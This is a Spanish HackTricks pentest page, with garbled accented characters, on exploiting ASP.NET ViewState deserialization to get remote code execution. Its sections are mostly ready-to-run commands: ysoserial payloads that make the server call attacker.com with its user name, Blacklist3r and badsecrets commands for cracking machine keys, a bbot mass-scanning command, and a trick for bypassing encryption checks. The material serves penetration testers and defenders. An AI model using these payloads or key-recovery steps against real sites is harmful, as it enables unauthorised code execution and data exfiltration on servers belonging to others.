# Explotaci√≥n de \_\_VIEWSTATE sin conocer los secretos

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si est√°s interesado en una **carrera de hacking** y hackear lo inhackeable - **¬°estamos contratando!** (_se requiere polaco fluido escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

## Qu√© es ViewState

**ViewState** es el m√©todo que utiliza por defecto el framework ASP.NET para **preservar valores de p√°ginas y controles entre p√°ginas web**. Cuando se renderiza el HTML de la p√°gina, el estado actual de la p√°gina y los valores que necesitan ser retenidos durante el postback se serializan en cadenas codificadas en base64 y se muestran en el campo oculto ViewState o campos.\
Las siguientes propiedades o combinaci√≥n de propiedades se aplican a la informaci√≥n de ViewState:

* Base64
* Puede ser definido usando los atributos EnableViewStateMac y ViewStateEncryptionMode establecidos en false
* Base64 + MAC (C√≥digo de Autenticaci√≥n de Mensajes) Habilitado
* Puede ser definido usando el atributo EnableViewStateMac establecido en true
* Base64 + Encriptado
* Puede ser definido usando el atributo viewStateEncryptionMode establecido en true

## **Casos de Prueba**

![](<../../.gitbook/assets/image (309) (2).png>)

### Caso de Prueba: 1 ‚Äì EnableViewStateMac=false y viewStateEncryptionMode=false

Tambi√©n es posible deshabilitar completamente el ViewStateMAC estableciendo la clave de registro `AspNetEnforceViewStateMac` en cero en:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**Identificaci√≥n de Atributos ViewState**

Puede intentar identificar si ViewState est√° protegido por MAC capturando una solicitud que contenga este par√°metro con BurpSuite:

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/1.0.png)

Si Mac no se utiliza para proteger el par√°metro, puede explotarlo usando [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net).
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### Caso de prueba 1.5 ‚Äì Como el Caso de prueba 1 pero el cookie ViewState no es enviado por el servidor

Los desarrolladores pueden **eliminar ViewState** para que no forme parte de una solicitud HTTP (el usuario no recibir√° este cookie).\
Se podr√≠a asumir que si **ViewState** **no est√° presente**, su implementaci√≥n es **segura** frente a cualquier vulnerabilidad potencial que surja con la deserializaci√≥n de ViewState.\
Sin embargo, eso no es as√≠. Si **a√±adimos el par√°metro ViewState** al cuerpo de la solicitud y enviamos nuestro payload serializado creado con ysoserial, todav√≠a seremos capaces de lograr **ejecuci√≥n de c√≥digo** como se muestra en el **Caso 1**.

### Caso de Prueba: 2 ‚Äì .Net < 4.5 y EnableViewStateMac=true & ViewStateEncryptionMode=false

Para **habilitar ViewState MAC** para una **p√°gina espec√≠fica** necesitamos hacer los siguientes cambios en un archivo aspx espec√≠fico:
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
Tambi√©n podemos hacerlo para la aplicaci√≥n **overall** configur√°ndolo en el archivo **web.config** como se muestra a continuaci√≥n:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
Como el par√°metro est√° protegido por MAC, esta vez para ejecutar el ataque con √©xito primero necesitamos la clave utilizada. En este caso, BurpSuite nos informar√° de que el par√°metro est√° protegido por MAC:

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/2.0.png)

Puedes intentar usar [**Blacklist3r(AspDotNetWrapper.exe)**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) para encontrar la clave utilizada.
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
```markdown
![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/2.1.png)

[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) es otra herramienta que puede identificar machineKeys conocidos. Est√° escrita en Python, por lo que a diferencia de Blacklist3r, no depende de Windows. Para viewstates de .NET, existe la utilidad "python blacklist3r", que es la forma m√°s r√°pida de usarla.

Puede suministrarse directamente con el viewstate y el generador:
```
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
```markdown
O, puede conectarse directamente a la URL objetivo e intentar extraer el viewstate del HTML:
```
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
Para buscar viewstates vulnerables a gran escala, en conjunto con la enumeraci√≥n de subdominios, se puede utilizar el m√≥dulo `badsecrets` [**BBOT**](exploiting-__viewstate-parameter.md):
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

Si tienes suerte y encuentras la clave, puedes proceder con el ataque utilizando [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:**
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
En casos donde el par√°metro `_VIEWSTATEGENERATOR` **no es enviado** por el servidor, **no** necesitas **proporcionar** el par√°metro `--generator` **sino estos**:
```bash
--apppath="/" --path="/hello.aspx"
```
### Caso de prueba: 3 ‚Äì .Net < 4.5 y EnableViewStateMac=true/false y ViewStateEncryptionMode=true

En este caso, Burp no encuentra si el par√°metro est√° protegido con MAC porque no reconoce los valores. Entonces, el valor probablemente est√° cifrado y **necesitar√°s la Machine Key para cifrar tu payload** para explotar la vulnerabilidad.

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/3.0.png)

**En este caso, el m√≥dulo** [**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **est√° en desarrollo...**

**Antes de .NET 4.5**, ASP.NET puede **aceptar** un par√°metro \_`__VIEWSTATE`\_ **sin cifrar** de los usuarios **incluso** si **`ViewStateEncryptionMode`** se ha establecido en _**Always**_. ASP.NET **solo verifica** la **presencia** del par√°metro **`__VIEWSTATEENCRYPTED`** en la solicitud. **Si se elimina este par√°metro y se env√≠a el payload sin cifrar, a√∫n se procesar√°.**

Por lo tanto, si se conoce la Machinekey (por ejemplo, a trav√©s de un problema de recorrido de directorio), el comando de [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) utilizado en el **Caso 2**, se puede usar para realizar RCE utilizando la vulnerabilidad de deserializaci√≥n de ViewState.

* Elimina el par√°metro `__VIEWSTATEENCRYPTED` de la solicitud para explotar la vulnerabilidad de deserializaci√≥n de ViewState, de lo contrario, devolver√° un error de validaci√≥n de MAC de Viewstate y el exploit fallar√° como se muestra en la Figura:

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/3.1.png)

### Caso de prueba: 4 ‚Äì .Net >= 4.5 y EnableViewStateMac=true/false y ViewStateEncryptionMode=true/false excepto ambos atributos en false

Podemos forzar el uso del framework de ASP.NET especificando el siguiente par√°metro dentro del archivo web.config como se muestra a continuaci√≥n.
```markup
<httpRuntime targetFramework="4.5" />
```
Alternativamente, esto se puede hacer especificando la opci√≥n a continuaci√≥n dentro del par√°metro `machineKey` del archivo web.config.
```bash
compatibilityMode="Framework45"
```
Como en el caso anterior, Burp no identifica si la solicitud est√° protegida por MAC porque **el valor est√° cifrado.** Entonces, para enviar un **payload v√°lido, el atacante necesita la clave**.

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.0.png)

Puedes intentar usar [**Blacklist3r(AspDotNetWrapper.exe)**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) para encontrar la clave que se est√° utilizando:
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
Para una descripci√≥n m√°s detallada de IISDirPath y TargetPagePath [consulte aqu√≠](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.1.png)

O, con [**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) (con un valor de generador):
```
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
```markdown
![](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

Una vez identificada una clave de m√°quina v√°lida, **el siguiente paso es generar un payload serializado utilizando** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)
```
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
Si tienes el valor de `__VIEWSTATEGENERATOR`, puedes intentar **usar** el par√°metro `--generator` con ese valor y **omitir** los par√°metros `--path` y `--apppath`

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.2.png)

Si la vulnerabilidad de deserializaci√≥n de ViewState se explota con √©xito, un servidor controlado por el atacante recibir√° una solicitud fuera de banda que contiene el nombre de usuario. [Prueba de Concepto de Explotaci√≥n Exitosa](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC)

### Caso de Prueba 6 ‚Äì Se est√° utilizando ViewStateUserKeys

La propiedad **ViewStateUserKey** se puede utilizar para **defenderse** contra un **ataque CSRF**. Si se ha definido tal clave en la aplicaci√≥n y tratamos de generar el **ViewState** payload con los m√©todos discutidos hasta ahora, el **payload no ser√° procesado por la aplicaci√≥n**.\
Necesitas usar un par√°metro m√°s para crear correctamente el payload:
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### Resultado de una Explotaci√≥n Exitosa <a href="#poc" id="poc"></a>

Para todos los casos de prueba, si el payload de ViewState YSoSerial.Net funciona **exitosamente**, entonces el servidor responde con ‚Äú**500 Internal server error**‚Äù teniendo contenido de respuesta ‚Äú**La informaci√≥n de estado es inv√°lida para esta p√°gina y podr√≠a estar corrupta**‚Äù y recibimos la solicitud OOB como se muestra en las Figuras a continuaci√≥n:

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/5.0POC-of-Seccuessful-exploitation.png)

solicitud fuera de banda con el nombre de usuario actual

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/5.1POC-of-Seccuessful-exploitation.png)

## Referencias

* [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
* [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)
* [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si est√°s interesado en una **carrera en hacking** y hackear lo inhackeable - **¬°estamos contratando!** (_se requiere polaco fluido escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue**me en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
